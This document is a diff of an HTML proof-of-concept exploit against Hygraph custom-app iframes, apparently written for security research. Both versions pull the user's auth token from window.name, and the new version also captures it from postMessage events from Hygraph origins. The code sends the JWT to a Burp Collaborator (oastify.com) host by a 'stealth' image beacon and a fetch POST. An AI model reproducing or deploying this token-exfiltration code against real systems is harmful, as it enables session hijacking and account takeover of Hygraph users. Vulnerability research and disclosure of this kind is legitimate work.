@@ -1,32 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-<script src="https://cdn.jsdelivr.net/npm/@graphcms/zoid@9.0.64-alpha.1/lib/zoid.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/@hygraph/app-sdk@1.0.0-beta.13/dist/app-sdk.umd.production.min.js"></script>
+    <title>PoC</title>
 </head>
 <body>
-  <div id="output">Attempting Capture...</div>
-  <script>
-  try {
-    // 1. Wait a second for Hygraph to populate window.name
-    setTimeout(() => {
-      if (window.name) {
-        // 2. Decode the raw data injected by the parent Studio
-        const metadata = JSON.parse(atob(window.name));
-        const token = metadata.props.context.environment.authToken;
+    <div id="status">Initializing...</div>
+    <script>
+        (function() {
+            const status = document.getElementById('status');
+            
+            // 1. Try to extract from window.name (Standard Zoid/Hygraph behavior)
+            try {
+                if (window.name) {
+                    const decoded = JSON.parse(atob(window.name));
+                    const token = decoded.props.context.environment.authToken;
+                    
+                    if (token) {
+                        status.textContent = "Token Captured (via window.name)";
+                        exfiltrate(token);
+                        return;
+                    }
+                }
+            } catch (e) { console.log("window.name parsing failed"); }
 
-        if (token) {
-          // 3. Exfiltrate to your Burp Collab
-          fetch("https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/?stolen=" + encodeURIComponent(token), {
-            mode: 'no-cors'
-          });
-          console.log("Captured.");
-        }
-      }
-    }, 1000);
-  } catch(e) {
-    console.error("Exploit failed", e);
-  }
-</script>
+            // 2. Fallback: Listen for the 'props' message from the parent
+            window.addEventListener('message', function(event) {
+                // Filter for Hygraph origins
+                if (event.origin.includes('hygraph.com') || event.origin.includes('graphcms.com')) {
+                    const data = event.data;
+                    // Look for the auth token in the message payload
+                    const token = data?.props?.context?.environment?.authToken || data?.context?.environment?.authToken;
+                    
+                    if (token) {
+                        status.textContent = "Token Captured (via postMessage)";
+                        exfiltrate(token);
+                    }
+                }
+            });
+
+            function exfiltrate(jwt) {
+                const collabURL = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
+                
+                // Using image beacon for maximum stealth and compatibility
+                const img = new Image();
+                img.src = collabURL + "?stolen=" + encodeURIComponent(jwt);
+                
+                // Backup: Fetch POST
+                fetch(collabURL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ jwt: jwt })
+                });
+            }
+
+            status.textContent = "Waiting for data...";
+        })();
+    </script>
 </body>
 </html>
